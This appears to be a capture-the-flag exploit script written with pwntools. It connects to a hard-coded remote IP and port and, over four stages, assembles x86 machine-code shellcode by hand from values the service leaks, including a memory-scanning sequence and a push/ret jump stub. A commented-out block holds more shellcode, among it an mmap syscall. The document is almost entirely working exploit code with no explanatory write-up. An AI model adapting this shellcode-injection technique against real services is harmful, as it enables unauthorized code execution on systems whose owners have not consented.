#!/usr/bin/python
from pwn import *

r = remote ("175.119.158.132", 31337)

log.info ("Stage 1")
#stage1
moveax = "b8" 
movebx = "bb"
movecx = "b9"
movedx = "ba"
movesp = "bc"
movebp = "bd"
movesi = "be"
movedi = "bf"

movlist = [moveax, movebx, movecx, movedx, movesp, movebp, movesi, movedi]

r.recvuntil ("below")
r.recvline ()

for i in range (0,8):
  line = r.recvline ()
#  print line[:-1]
  line = line.split (" ")
  hv = line[2][2:]
  movlist[i] += hv[6:8]+hv[4:6]+hv[2:4]+hv[0:2]

se = "".join (movlist)
r.sendline (se)

r.recvline ()

r.recvuntil ("Stage1 Clear!", timeout = 3)

#stage2
log.info ("Stage 2")

r.recvuntil ("below")

r.recvline ()
eq = r.recvline ()
moveax = "b8" 
movebx = "bb"
movecx = "b9"
movedx = "ba"
movesp = "bc"
movebp = "bd"
movesi = "be"
movedi = "bf"

movlist = [moveax, movebx, movecx, movedx, movesp, movebp, movesi, movedi]

eq = eq.split (" ")
target = eq[17]
hv = hex (int (target))[2:]


movlist[0] += hv[6:8]+hv[4:6]+hv[2:4]+hv[0:2]

for i in range (1, 8):
  movlist[i] += "00000000"
if eq[1] == "*":
  movlist[5] = "bd01000000"
  if eq[3] == "*":
    movlist[4] = "bc01000000"

se = "".join (movlist)

r.sendline (se)
r.recvline ()
r.recvuntil ("input Opcode")

log.info ("Stage 3")
#stage 3

moveax = "b8" 
movebx = "bb"
movecx = "b9"
movedx = "ba"
movesp = "bc"
movebp = "bd"
movesi = "be"
movedi = "bf"

movlist = [moveax, movebx, movecx, movedx, movesp, movebp, movesi, movedi]

sys_write = "b9ffffffffbf0011000066f3af89f8"
r.sendline (sys_write)
r.recvline ()
r.recvuntil ("eip yeah!")

log.info ("Stage 4")
#stage 4

r.recvline ()
line = r.recvline ()
#dd
line = line.split (" ")



hv = hex (int (line[1][:-1], 16) - 1001)[2:]
print hv

target = hv[3:5]+hv[1:3]+"0"+hv[0:1] + "00"
print target



#D~~~ahun did
#sc = "bc"+target+"b801100000"+ "ffe0"
sc = "6823000000"+"68"+target+"8d04248b08c3"

r.sendline (sc)

r.recvline ()
print r.recv (2048)

r.close ()
"""
eip = int(line[1],16)

log.info("Object : " + hex(eip))

addr = p32(eip).encode('hex')


eip = eip - 0x1025

target = p32(eip).encode('hex')

target = target.zfill(8)

log.info("target : " + target + "mmap addr : " + addr.zfill(8))

#sc = "b85a0000006a006aff6a226a07680001000068" + addr.zfill(8) + "8d1c24cd80"

#sc = "b87d000000bb" + addr.zfill(8) + "b900020000ba07000000"



#log.info(sc)

r.sendline(sys_write)

log.info(r.recv())
log.info(r.recv())
log.info(r.recv())
"""
